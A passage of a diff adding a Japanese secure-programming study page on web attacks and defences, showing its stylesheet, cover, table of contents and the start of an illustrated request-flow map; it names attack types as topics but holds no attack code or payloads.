@@ -1,0 +1,2946 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>セキュアプログラミング — 技術解説書 Ver.2</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP:wght@400;600&family=Noto+Sans+JP:wght@300;400;500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#141824;--ink2:#1e2d4a;--accent:#0b4a82;--accent2:#1570b8;
+  --gold:#b5821e;--soft:#e8edf5;--surface:#f3f6fb;--line:#cdd7e6;
+  --success:#155f44;--warn:#7a4208;--danger:#7a1818;
+  --mono:'JetBrains Mono',monospace;--serif:'Noto Serif JP',serif;--sans:'Noto Sans JP',sans-serif
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--sans);background:#edf1f8;color:var(--ink);font-size:15px;line-height:1.78}
+.cover{background:var(--ink);color:#fff;padding:72px 60px 56px;position:relative;overflow:hidden}
+.cover-kicker{font-size:11px;font-weight:700;letter-spacing:.2em;color:rgba(255,255,255,.42);text-transform:uppercase;margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.cover-kicker::before{content:'';display:block;width:24px;height:1px;background:var(--gold)}
+.cover h1{font-family:var(--serif);font-size:40px;font-weight:600;line-height:1.22;margin-bottom:18px}
+.cover h1 em{color:#6ab4f5;font-style:normal}
+.cover-desc{font-size:14px;color:rgba(255,255,255,.58);max-width:560px;margin-bottom:36px;line-height:1.8}
+.cover-tags{display:flex;gap:7px;flex-wrap:wrap}
+.ctag{font-size:10.5px;padding:3px 11px;border-radius:3px;border:1px solid rgba(255,255,255,.16);color:rgba(255,255,255,.6);letter-spacing:.04em;font-family:var(--mono)}
+.layout{display:flex;align-items:flex-start}
+.sidebar{position:sticky;top:0;width:220px;flex-shrink:0;height:100vh;overflow-y:auto;background:var(--ink2);padding:28px 0}
+.sidebar-title{font-size:10px;font-weight:700;letter-spacing:.18em;color:rgba(255,255,255,.3);text-transform:uppercase;padding:0 20px 12px;border-bottom:1px solid rgba(255,255,255,.08);margin-bottom:8px}
+.sidebar nav a{display:block;padding:8px 20px;font-size:12.5px;color:rgba(255,255,255,.55);text-decoration:none;border-left:2px solid transparent;transition:all .15s;line-height:1.45}
+.sidebar nav a:hover{color:#fff;background:rgba(255,255,255,.05)}
+.sidebar nav a.active{color:#6ab4f5;border-left-color:#6ab4f5;background:rgba(100,180,245,.07)}
+.sidebar nav .nav-num{font-family:var(--mono);font-size:9px;color:rgba(255,255,255,.25);display:block;margin-bottom:1px}
+.main{flex:1;min-width:0;padding:52px 52px 100px}
+.section{margin-bottom:80px;scroll-margin-top:24px}
+.section-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:26px;padding-bottom:16px;border-bottom:1px solid var(--line)}
+.s-num{font-family:var(--mono);font-size:10px;font-weight:500;color:#fff;background:var(--accent);padding:3px 8px;border-radius:3px;margin-top:5px;white-space:nowrap;flex-shrink:0}
+.s-num.gold-bg{background:var(--gold)}
+.s-num.red-bg{background:var(--danger)}
+.s-num.green-bg{background:var(--success)}
+h2{font-family:var(--serif);font-size:24px;font-weight:600;color:var(--ink);line-height:1.3}
+h3{font-size:15px;font-weight:700;color:var(--ink2);margin:32px 0 12px;padding-left:10px;border-left:3px solid var(--accent2)}
+p{color:#3a3d52;margin-bottom:14px}
+.steps{display:flex;flex-direction:column;gap:8px;margin:16px 0}
+.step{display:flex;gap:12px;align-items:flex-start;padding:11px 15px;border-radius:6px;background:var(--surface);border-left:3px solid var(--line)}
+.step.ok{background:#eaf7f1;border-left-color:var(--success)}
+.step.wn{background:#fdf5e6;border-left-color:var(--gold)}
+.step.ng{background:#fdf0f0;border-left-color:var(--danger)}
+.step.hi{background:#eaf3ff;border-left-color:var(--accent2)}
+.sn{font-family:var(--mono);font-size:10px;font-weight:500;color:#fff;background:var(--accent2);min-width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.step.ok .sn{background:var(--success)}
+.step.wn .sn{background:var(--gold)}
+.step.ng .sn{background:var(--danger)}
+.sb{font-size:13.5px;color:var(--ink);line-height:1.65}
+.sb strong{color:var(--ink2)}
+.sb code{font-family:var(--mono);font-size:11.5px;background:rgba(11,74,130,.08);color:var(--accent);padding:1px 5px;border-radius:3px}
+.note{display:flex;gap:11px;border-radius:6px;padding:13px 16px;margin:14px 0;border:1px solid}
+.note p{margin:0;font-size:13px;line-height:1.7}
+.note.info{background:#e8f3fd;border-color:#a8cef5}
+.note.info p{color:#0b3a6a}
+.note.warn{background:#fdf5e6;border-color:#e8c97a}
+.note.warn p{color:#5a3200}
+.note.danger{background:#fdf0f0;border-color:#e8a8a8}
+.note.danger p{color:#5a0000}
+.keypoint{background:var(--ink);color:#fff;border-radius:8px;padding:20px 26px;margin:24px 0}
+.kp-label{font-size:9.5px;font-weight:700;letter-spacing:.2em;color:rgba(181,130,30,.9);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+.kp-label::before{content:'';display:block;width:16px;height:1px;background:var(--gold)}
+.keypoint p{color:rgba(255,255,255,.82);margin:0;font-size:13.5px;line-height:1.8}
+.keypoint strong{color:#6ab4f5}
+.cmp-table{width:100%;border-collapse:collapse;font-size:13px;margin:16px 0}
+.cmp-table th{background:var(--accent);color:#fff;padding:9px 13px;text-align:center;font-size:11px;font-weight:600;letter-spacing:.06em}
+.cmp-table th:first-child{text-align:left;background:var(--ink2)}
+.cmp-table td{padding:9px 13px;border:1px solid var(--line);text-align:center;font-size:12.5px;vertical-align:middle}
+.cmp-table td:first-child{text-align:left;font-weight:600;color:var(--ink2);background:var(--surface);white-space:nowrap}
+.cmp-good{color:var(--success);font-weight:600}
+.cmp-bad{color:var(--danger)}
+.cmp-mid{color:var(--warn)}
+.header-block{background:#0d1117;border-radius:8px;padding:20px 22px;margin:16px 0;font-family:var(--mono);font-size:11.5px;line-height:1.85;overflow-x:auto}
+.hbf{color:#79b8ff}.hbv{color:#e1e4e8}.hba{color:#6a737d}.hbw{color:#f9c74f}.hbok{color:#56d364}.hbng{color:#ff7b72}
+.term-table{width:100%;border-collapse:collapse;font-size:13px;margin:12px 0}
+.term-table td{padding:8px 11px;border-bottom:1px dashed var(--line);vertical-align:top}
+.term-table td:first-child{font-family:var(--mono);font-size:11px;color:var(--accent2);font-weight:500;white-space:nowrap;min-width:180px}
+.quiz-wrap{display:flex;flex-direction:column;gap:24px;margin:20px 0}
+.quiz{background:#fff;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.quiz-q{padding:14px 18px;background:var(--ink2);color:#fff;font-size:13.5px;line-height:1.65;display:flex;gap:12px}
+.quiz-qn{font-family:var(--mono);font-size:10px;background:rgba(255,255,255,.15);padding:2px 8px;border-radius:3px;white-space:nowrap;flex-shrink:0;height:fit-content;margin-top:2px}
+.quiz-opts{padding:14px 18px;display:flex;flex-direction:column;gap:7px}
+.quiz-opt{padding:8px 13px;border:1px solid var(--line);border-radius:5px;font-size:13px;color:var(--ink);cursor:pointer;transition:all .15s;background:#fff;text-align:left;line-height:1.5}
+.quiz-opt:hover{background:var(--surface);border-color:var(--accent2)}
+.quiz-opt.correct{background:#eaf7f1;border-color:var(--success);color:var(--success)}
+.quiz-opt.wrong{background:#fdf0f0;border-color:var(--danger);color:var(--danger)}
+.quiz-opt.reveal{background:var(--surface);color:#aaa}
+.quiz-exp{display:none;padding:12px 18px;background:#f0f6ff;border-top:1px solid #b8d5f5;font-size:13px;color:#0b3a6a;line-height:1.7}
+.quiz-exp.show{display:block}
+footer{background:var(--ink);color:rgba(255,255,255,.35);text-align:center;padding:22px;font-size:11.5px;letter-spacing:.05em;line-height:1.8}
+@media(max-width:800px){.sidebar{display:none}.main{padding:28px 20px 60px}.cover{padding:48px 24px 40px}.cover h1{font-size:28px}}
+
+/* ========== 動的分類マトリクス ========== */
+.matrix-wrap{background:#fff;border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:20px 0}
+.matrix-tabs{display:flex;background:var(--ink2);border-bottom:1px solid rgba(255,255,255,.1)}
+.mtab{padding:10px 18px;font-size:11.5px;font-weight:600;color:rgba(255,255,255,.5);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;letter-spacing:.04em;white-space:nowrap}
+.mtab.active{color:#6ab4f5;border-bottom-color:#6ab4f5;background:rgba(100,180,245,.07)}
+.mtab:hover:not(.active){color:rgba(255,255,255,.8)}
+.mpanel{display:none;padding:20px}
+.mpanel.active{display:block}
+
+/* 攻撃カード（マトリクス内） */
+.atk-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:20px;font-size:10.5px;font-weight:700;font-family:var(--mono);border:1.5px solid;white-space:nowrap}
+.atk-badge.danger{background:#fde8e8;border-color:#e09090;color:#7a1818}
+.atk-badge.warn{background:#fdf5e6;border-color:#e0c070;color:#7a4208}
+.atk-badge.blue{background:#daeeff;border-color:#8ab4f5;color:#1a3a8a}
+.atk-badge.green{background:#d0f0e0;border-color:#70c898;color:#155f44}
+.atk-badge.purple{background:#ede8ff;border-color:#b090e0;color:#5a1a9e}
+.atk-badge.teal{background:#d0f0ee;border-color:#70c8c8;color:#0e6060}
+
+/* ========== インタラクティブ攻撃カード ========== */
+.atkcard-wrap{display:flex;flex-direction:column;gap:16px;margin:20px 0}
+.atkcard{background:#fff;border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.atkcard-header{display:flex;align-items:center;gap:0;cursor:pointer;user-select:none;transition:background .15s}
+.atkcard-header:hover{background:var(--surface)}
+.atkcard-icon-zone{width:80px;flex-shrink:0;display:flex;align-items:center;justify-content:center;padding:16px 10px;min-height:80px}
+.atkcard-title-zone{flex:1;padding:14px 16px;min-width:0}
+.atkcard-name{font-size:15px;font-weight:800;font-family:var(--mono);margin-bottom:3px}
+.atkcard-tagline{font-size:11.5px;color:#666;line-height:1.4}
+.atkcard-chevron{padding:14px;flex-shrink:0;transition:transform .25s}
+.atkcard-chevron.open{transform:rotate(180deg)}
+.atkcard-body{display:none;border-top:1px solid var(--line)}
+.atkcard-body.open{display:block}
+
+/* ========== 通信フロー全体マップ ========== */
+.flowmap{background:#fff;border:1px solid var(--line);border-radius:12px;padding:24px;margin:20px 0;overflow-x:auto;position:relative}
+.flowmap-title{font-size:10.5px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.flowmap-title::after{content:'';flex:1;height:1px;background:var(--line)}
+
+/* ========== 比較マトリクス可視化 ========== */
+.radar-wrap{background:#fff;border:1px solid var(--line);border-radius:12px;padding:20px;margin:16px 0}
+
+/* ========== アコーディオン攻撃詳細 ========== */
+.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:20px}
+@media(max-width:900px){.detail-grid{grid-template-columns:1fr}}
+.detail-box{border-radius:8px;padding:14px;font-size:13px;line-height:1.65}
+.detail-box h4{font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px}
+.detail-box.analogy{background:#f5f0ff;border:1px solid #c0a0e8}
+.detail-box.analogy h4{color:#5a1a9e}
+.detail-box.mechanism{background:#fff5f0;border:1px solid #e0a080}
+.detail-box.mechanism h4{color:#7a2800}
+.detail-box.examples{background:#f0f8ff;border:1px solid #a0c8e8}
+.detail-box.examples h4{color:#1a3a8a}
+.detail-box.defense{background:#f0fbf5;border:1px solid #80c8a0}
+.detail-box.defense h4{color:#155f44}
+.detail-box p,.detail-box li{color:#3a3d52;font-size:12.5px;line-height:1.65;margin-bottom:6px}
+.detail-box ul{padding-left:16px}
+.detail-code{background:#0d1117;border-radius:6px;padding:10px 14px;margin:8px 0;font-family:var(--mono);font-size:10.5px;line-height:1.7;overflow-x:auto;color:#e1e4e8}
+.detail-code .k{color:#79b8ff}.detail-code .v{color:#e1e4e8}.detail-code .c{color:#6a737d}.detail-code .w{color:#f9c74f}.detail-code .ok{color:#56d364}.detail-code .ng{color:#ff7b72}
+.counter-tag{display:inline-block;background:#eaf7f1;border:1px solid #70c898;color:#155f44;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;font-family:var(--mono);margin:2px 2px 2px 0}
+.flow-step-row{display:flex;align-items:stretch;gap:0;margin:6px 0}
+.flow-actor{flex:0 0 110px;display:flex;flex-direction:column;align-items:center;gap:4px;padding:4px}
+.flow-actor-icon{width:48px;height:48px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.flow-actor-label{font-size:9px;font-weight:700;text-align:center;line-height:1.3}
+.flow-arrow-zone{flex:1;display:flex;align-items:center;gap:0;padding:0 4px;min-width:0}
+.flow-arrow-line{flex:1;height:2px;position:relative}
+.flow-arrow-tip{width:0;height:0;border-top:5px solid transparent;border-bottom:5px solid transparent;flex-shrink:0}
+.flow-arrow-left-tip{border-right:8px solid;margin-left:-1px}
+.flow-arrow-right-tip{border-left:8px solid;margin-right:-1px}
+.flow-msg{font-size:9.5px;font-weight:600;padding:2px 8px;border-radius:4px;white-space:nowrap;max-width:100%;overflow:hidden;text-overflow:ellipsis}
+
+/* ==== 攻撃イラスト用 共通スタイル (atk-*) ==== */
+.atk-scene{background:#fff;border:1px solid var(--line);border-radius:10px;padding:22px 18px 14px;margin:14px 0;overflow-x:auto}
+.atk-scene-inner{min-width:580px}
+.atk-lane{display:flex;align-items:stretch;gap:0}
+.atk-lane-bi{display:flex;flex-direction:column;gap:22px}
+.atk-node{flex:0 0 104px;display:flex;flex-direction:column;align-items:center;gap:7px;padding:4px 2px;justify-content:flex-end}
+.atk-node-wide{flex:0 0 130px}
+.atk-icon{width:62px;height:62px;border-radius:12px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,.08);background:#fff;flex-shrink:0}
+.atk-icon.attacker{background:#ffe8e8;border:2px solid #7a1818}
+.atk-icon.victim{background:#daeeff;border:2px solid #1a56cc}
+.atk-icon.server{background:#fff8e6;border:2px solid #b5821e}
+.atk-icon.db{background:#ede8ff;border:2px solid #5a1a9e}
+.atk-icon.webapp{background:#eaf7f1;border:2px solid #155f44}
+.atk-role{font-size:11px;font-weight:700;text-align:center;line-height:1.35}
+.atk-role.attacker{color:#7a1818}
+.atk-role.victim{color:#1a56cc}
+.atk-role.server{color:#7a4208}
+.atk-role.db{color:#5a1a9e}
+.atk-role.webapp{color:#155f44}
+.atk-role small{display:block;font-size:9.5px;font-weight:500;opacity:.85;margin-top:1px}
+.atk-arrowcol{flex:1;display:flex;flex-direction:column;justify-content:space-around;align-items:stretch;gap:18px;padding:8px 6px;min-width:90px;position:relative}
+.atk-arrow-pair{display:flex;flex-direction:column;gap:4px;align-items:center;width:100%}
+.atk-victims-stack{flex:0 0 130px;display:flex;flex-direction:column;align-items:stretch;gap:6px;justify-content:center;padding:4px 0}
+.atk-victim-mini{display:flex;align-items:center;gap:8px;padding:5px 9px;background:#daeeff;border:1.5px solid #1a56cc;border-radius:8px}
+.atk-victim-mini .atk-mini-icon{width:28px;height:28px;border-radius:6px;background:#fff;border:1.5px solid #1a56cc;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.atk-victim-mini .atk-mini-label{font-size:10px;font-weight:700;color:#1a3a8a}
+.atk-victim-mini .atk-mini-exec{margin-left:auto;font-size:9px;color:#7a1818;font-weight:700;background:#fde8e8;border-radius:3px;padding:1px 5px;border:1px solid #e08080}
+.atk-memory{flex:1;display:flex;flex-direction:column;gap:8px;padding:12px;background:#f3f6fb;border-radius:8px;border:1.5px solid var(--line);min-width:260px}
+.atk-mem-title{font-size:10px;font-weight:700;color:#555;text-align:center;letter-spacing:.08em;text-transform:uppercase}
+.atk-mem-row{display:flex;gap:0;align-items:stretch;height:56px;position:relative}
+.atk-mem-cell{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;padding:6px;border-radius:5px}
+.atk-mem-cell.buffer{flex:1;background:#daeeff;border:2px solid #1a56cc;min-width:90px}
+.atk-mem-cell.retaddr{flex:0 0 130px;background:#fde8e8;border:2px solid #7a1818}
+.atk-mem-cell-name{font-size:10.5px;font-weight:700}
+.atk-mem-cell.buffer .atk-mem-cell-name{color:#1a3a8a}
+.atk-mem-cell.retaddr .atk-mem-cell-name{color:#7a1818}
+.atk-mem-cell-sub{font-size:9px;font-family:var(--mono)}
+.atk-mem-cell.buffer .atk-mem-cell-sub{color:#1a56cc}
+.atk-mem-cell.retaddr .atk-mem-cell-sub{color:#7a1818;font-weight:700}
+.atk-mem-spill{font-size:16px;color:#7a1818;font-weight:900;padding:0 4px;display:flex;align-items:center;justify-content:center;animation:spill 1.2s infinite}
+@keyframes spill{0%,100%{opacity:1}50%{opacity:.4}}
+.atk-mem-note{font-size:10px;color:#7a1818;text-align:center;margin-top:2px;font-style:italic}
+/* 建物フロア図 (ディレクトリトラバーサル用) */
+.atk-building{flex:1;display:flex;flex-direction:column;gap:3px;padding:10px;background:#f5f5f5;border:1.5px solid #999;border-radius:8px;min-width:280px}
+.atk-floor{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:4px;border:1.5px solid;position:relative;min-height:46px}
+.atk-floor.public{background:#eaf3ff;border-color:#8ab4e8}
+.atk-floor.middle{background:#fff8e6;border-color:#e0c070}
+.atk-floor.secret{background:#fde8e8;border-color:#e08080}
+.atk-floor-label{font-size:11px;font-weight:700;flex:0 0 90px}
+.atk-floor.public .atk-floor-label{color:#1a3a8a}
+.atk-floor.middle .atk-floor-label{color:#7a4208}
+.atk-floor.secret .atk-floor-label{color:#7a1818}
+.atk-floor-path{font-family:var(--mono);font-size:10px;color:#555;flex:1}
+.atk-floor-items{display:flex;gap:4px}
+.atk-floor-item{background:#fff;border:1px solid;border-radius:3px;padding:2px 6px;font-size:9.5px;font-family:var(--mono)}
+.atk-floor.public .atk-floor-item{border-color:#8ab4e8;color:#1a3a8a}
+.atk-floor.middle .atk-floor-item{border-color:#e0c070;color:#7a4208}
+.atk-floor.secret .atk-floor-item{border-color:#e08080;color:#7a1818}
+.atk-traversal-arrow{position:absolute;right:-6px;padding:4px 8px;background:#7a1818;color:#fff;border-radius:12px;font-family:var(--mono);font-size:10px;font-weight:700;box-shadow:0 2px 4px rgba(0,0,0,.15)}
+.atk-traversal-arrow.up1{top:-12px;right:48px}
+.atk-traversal-arrow.up2{top:-12px;right:48px}
+/* クリックジャッキング用 レイヤー重ね */
+.atk-click-stack{flex:1;display:flex;flex-direction:column;gap:10px;min-width:280px;padding:6px 2px}
+.atk-click-layer{background:#fff;border:2px solid;border-radius:8px;padding:10px 14px;position:relative;min-height:62px}
+.atk-click-layer.decoy{border-color:#b5821e;background:#fffaf0}
+.atk-click-layer.hidden{border-color:#7a1818;background:#fde8e8;border-style:dashed}
+.atk-click-layer-title{position:absolute;top:-9px;left:10px;background:#fff;padding:1px 7px;font-size:9.5px;font-weight:700;letter-spacing:.05em;border-radius:2px}
+.atk-click-layer.decoy .atk-click-layer-title{color:#7a4208;border:1px solid #e0c070}
+.atk-click-layer.hidden .atk-click-layer-title{color:#7a1818;border:1px solid #e08080}
+.atk-click-btn{display:inline-block;padding:5px 14px;border-radius:5px;font-size:11px;font-weight:700;margin-top:4px}
+.atk-click-btn.decoy{background:#f5c97a;color:#7a4208;border:1.5px solid #b5821e}
+.atk-click-btn.real{background:#fff;color:#7a1818;border:1.5px solid #7a1818}
+.atk-click-stack-glue{display:flex;align-items:center;gap:6px;font-size:10px;color:#7a1818;font-weight:600;padding-left:8px}
+.atk-click-finger{position:absolute;top:14px;left:50%;transform:translateX(-50%);z-index:3;font-size:18px;pointer-events:none}
+.atk-step-no{display:inline-flex;align-items:center;justify-content:center;width:19px;height:19px;border-radius:50%;font-size:10px;font-weight:800;color:#fff;font-family:var(--mono);flex-shrink:0}
+.atk-step-no.danger{background:#7a1818}
+.atk-step-no.info{background:#1a56cc}
+.atk-step-no.warn{background:#b5821e}
+.atk-step-no.success{background:#155f44}
+.atk-step-no.purple{background:#5a1a9e}
+.atk-label{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;line-height:1.35;justify-content:center;white-space:nowrap}
+.atk-label.danger{color:#7a1818}
+.atk-label.info{color:#1a56cc}
+.atk-label.warn{color:#7a4208}
+.atk-label.success{color:#155f44}
+.atk-label.purple{color:#5a1a9e}
+.atk-payload{font-family:var(--mono);font-size:10px;background:#fff;border:1px solid;border-radius:4px;padding:3px 8px;text-align:center;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.atk-payload.danger{border-color:#e8a8a8;color:#7a1818;background:#fde8e8}
+.atk-payload.info{border-color:#a8c8f5;color:#1a3a8a;background:#eaf3ff}
+.atk-payload.warn{border-color:#e0c070;color:#7a4208;background:#fdf5e6}
+.atk-payload.success{border-color:#80c898;color:#155f44;background:#eaf7f1}
+.atk-line{height:2px;position:relative;flex-shrink:0}
+.atk-line.danger{background:#7a1818}
+.atk-line.info{background:#1a56cc}
+.atk-line.warn{background:#b5821e}
+.atk-line.success{background:#155f44}
+.atk-line.purple{background:#5a1a9e}
+.atk-line.dashed.danger{background:repeating-linear-gradient(90deg,#7a1818 0,#7a1818 5px,transparent 5px,transparent 9px)}
+.atk-line.dashed.info{background:repeating-linear-gradient(90deg,#1a56cc 0,#1a56cc 5px,transparent 5px,transparent 9px)}
+.atk-line.dashed.warn{background:repeating-linear-gradient(90deg,#b5821e 0,#b5821e 5px,transparent 5px,transparent 9px)}
+.atk-arrow-r::after{content:'';position:absolute;right:-1px;top:-4px;width:0;height:0;border-top:5px solid transparent;border-bottom:5px solid transparent;border-left:7px solid currentColor;color:inherit}
+.atk-arrow-r.danger::after{border-left-color:#7a1818}
+.atk-arrow-r.info::after{border-left-color:#1a56cc}
+.atk-arrow-r.warn::after{border-left-color:#b5821e}
+.atk-arrow-r.success::after{border-left-color:#155f44}
+.atk-arrow-r.purple::after{border-left-color:#5a1a9e}
+.atk-arrow-l::before{content:'';position:absolute;left:-1px;top:-4px;width:0;height:0;border-top:5px solid transparent;border-bottom:5px solid transparent;border-right:7px solid currentColor;color:inherit}
+.atk-arrow-l.danger::before{border-right-color:#7a1818}
+.atk-arrow-l.info::before{border-right-color:#1a56cc}
+.atk-excl{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;border-radius:50%;font-size:11px;font-weight:800;background:#fde8e8;color:#7a1818;border:1.5px solid #7a1818;flex-shrink:0;line-height:1}
+.atk-note{display:flex;align-items:flex-start;gap:7px;margin-top:12px;padding:9px 13px;background:#f3f6fb;border-left:3px solid var(--accent2);border-radius:4px;font-size:12px;color:#3a3d52;line-height:1.65}
+.atk-note.danger{background:#fdf0f0;border-left-color:#7a1818;color:#5a0000}
+.atk-caption{margin-top:12px;text-align:center;font-size:11.5px;color:#555;line-height:1.6;padding:0 8px}
+.atk-zone{flex:1;display:flex;align-items:center;gap:8px;padding:12px 10px;border-radius:8px;border:1.5px dashed;min-height:120px}
+.atk-zone.trusted{background:#f5f0ff;border-color:#b090e0}
+.atk-zone.public{background:#eaf3ff;border-color:#8ec8f5}
+.atk-zone.internal{background:#eaf7f1;border-color:#80c898}
+.atk-zone-label{position:absolute;top:4px;left:10px;font-size:9.5px;font-weight:700;letter-spacing:.05em}
+.atk-fw{flex:0 0 18px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;background:repeating-linear-gradient(180deg,#fff8e6 0,#fff8e6 6px,transparent 6px,transparent 10px);border-left:2px solid #b5821e;border-right:2px solid #b5821e;padding:8px 0;writing-mode:vertical-rl;font-size:10px;font-weight:700;color:#7a4208;letter-spacing:.1em;align-self:stretch}
+.atk-stepbox{background:#fff;border:1px solid #ccc;border-radius:5px;padding:6px 9px;font-size:10.5px}
+.atk-stepbox.danger{background:#fde8e8;border-color:#e08080;color:#7a1818}
+.atk-stepbox.info{background:#eaf3ff;border-color:#a8c8f5;color:#1a3a8a}
+.atk-stepbox.warn{background:#fdf5e6;border-color:#e0c070;color:#7a4208}
+.atk-stepbox.success{background:#eaf7f1;border-color:#80c898;color:#155f44}
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div style="position:absolute;top:0;right:0;width:480px;height:480px;opacity:.05;pointer-events:none">
+    <div style="position:absolute;top:40px;right:40px;width:320px;height:240px;border:1px solid white;border-radius:8px"></div>
+    <div style="position:absolute;top:55px;right:55px;width:290px;height:40px;border:1px solid white;opacity:.5"></div>
+    <div style="position:absolute;top:140px;right:80px;width:100px;height:80px;background:white;border-radius:4px;opacity:.15"></div>
+    <div style="position:absolute;top:320px;right:60px;width:200px;height:100px;border:1px solid white;border-radius:50%"></div>
+    <div style="position:absolute;top:340px;right:80px;width:160px;height:60px;border:1px solid white;border-radius:50%;opacity:.5"></div>
+  </div>
+  <div style="position:relative">
+    <p class="cover-kicker">技術解説書 — 情報処理安全確保支援士対応</p>
+    <h1>セキュアプログラミング<br>— <em>Webアプリ攻撃と対策</em></h1>
+    <p class="cover-desc">XSS・SQLインジェクション・CSRF・バッファオーバーフローから、SSRF・セッション攻撃・ディレクトリトラバーサル・OSコマンドインジェクション・クリックジャッキング・HTTPヘッダインジェクションまで。攻撃フロー・具体例・対策コードを体系的に整理した完全版解説書。</p>
+    <div class="cover-tags">
+      <span class="ctag">XSS</span><span class="ctag">SQLi</span><span class="ctag">CSRF / SSRF</span><span class="ctag">BOF</span><span class="ctag">セッション攻撃</span><span class="ctag">OSコマンドインジェクション</span><span class="ctag">クリックジャッキング</span><span class="ctag">ヘッダインジェクション</span>
+    </div>
+  </div>
+</div>
+
+<div class="layout">
+<aside class="sidebar">
+  <p class="sidebar-title">目次</p>
+  <nav>
+    <a href="#s1" onclick="setActive(this)"><span class="nav-num">01</span>全体マップと分類</a>
+    <a href="#s2" onclick="setActive(this)"><span class="nav-num">02</span>XSS</a>
+    <a href="#s3" onclick="setActive(this)"><span class="nav-num">03</span>SQLインジェクション</a>
+    <a href="#s4" onclick="setActive(this)"><span class="nav-num">04</span>バッファオーバーフロー</a>
+    <a href="#s5" onclick="setActive(this)"><span class="nav-num">05</span>CSRF</a>
+    <a href="#s6" onclick="setActive(this)"><span class="nav-num">06</span>SSRF</a>
+    <a href="#s7" onclick="setActive(this)"><span class="nav-num">07</span>セッション攻撃</a>
+    <a href="#s8" onclick="setActive(this)"><span class="nav-num">08</span>ディレクトリトラバーサル</a>
+    <a href="#s9" onclick="setActive(this)"><span class="nav-num">09</span>OSコマンドインジェクション</a>
+    <a href="#s10" onclick="setActive(this)"><span class="nav-num">10</span>クリックジャッキング</a>
+    <a href="#s11" onclick="setActive(this)"><span class="nav-num">11</span>HTTPヘッダインジェクション</a>
+    <a href="#s12" onclick="setActive(this)"><span class="nav-num">12</span>メールヘッダインジェクション</a>
+    <a href="#s13" onclick="setActive(this)"><span class="nav-num">13</span>練習問題</a>
+    <a href="#s14" onclick="setActive(this)"><span class="nav-num">14</span>重要用語まとめ</a>
+  </nav>
+</aside>
+<main class="main">
+
+<!-- ================================================================
+     S01 全体マップ
+================================================================ -->
+<section class="section" id="s1">
+<div class="section-header"><span class="s-num">01</span><h2>全体像 — Web通信の流れと攻撃の侵入ポイント</h2></div>
+
+<p>まずWebアプリへのリクエスト・レスポンスの全体フローを俯瞰します。攻撃はこのフローの<strong>特定の「隙間」</strong>に侵入します。どの隙間を狙う攻撃なのかを把握することが理解の核心です。</p>
+
+<!-- 通信全体マップ（HTML+CSS座標計算 — 全ノード完全整列版） -->
+<div class="flowmap">
+  <div class="flowmap-title">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    Web通信の全体フロー — 攻撃侵入ポイントマップ
+  </div>
+
+  <!-- 全体フロー図 — 各ゾーンは独立コンテナ、アイコンは全てセンタリング -->
+  <div style="min-width:900px">
+
+    <!-- メインフロー行：ゾーンと矢印を交互配置 -->
+    <div style="display:flex;align-items:stretch;gap:0">
+
+      <!-- ============= Zone 1: ユーザ端末 ============= -->
+      <div style="flex:0 0 150px;background:#eaf3ff;border:1.5px dashed #8ab4f5;border-radius:10px;padding:12px 8px 14px;display:flex;flex-direction:column;align-items:center;gap:8px">
+        <!-- ゾーンラベル -->
+        <div style="font-size:9px;font-weight:700;color:#1a3a8a;letter-spacing:.08em;text-transform:uppercase;text-align:center;line-height:1.3">ユーザ端末</div>
+        <!-- アイコンボックス -->
+        <div style="width:76px;height:76px;background:#fff;border:2.5px solid #1a56cc;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 3px 10px rgba(26,86,204,.25)">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <rect x="3" y="6" width="34" height="28" rx="4" fill="#daeeff" stroke="#1a56cc" stroke-width="1.5"/>
+            <rect x="3" y="6" width="34" height="9" rx="4" fill="#1a56cc" stroke="none"/>
+            <rect x="3" y="11" width="34" height="4" fill="#1a56cc" stroke="none"/>
+            <circle cx="8" cy="10" r="1.5" fill="white" opacity=".7"/>
+            <circle cx="13" cy="10" r="1.5" fill="white" opacity=".7"/>
+            <circle cx="18" cy="10" r="1.5" fill="white" opacity=".7"/>
+            <rect x="22" y="8" width="13" height="4" rx="2" fill="rgba(255,255,255,.4)"/>
+            <rect x="8" y="18" width="24" height="2.5" rx="1.2" fill="#1a56cc" opacity=".3"/>
+            <rect x="8" y="23" width="20" height="2.5" rx="1.2" fill="#1a56cc" opacity=".25"/>
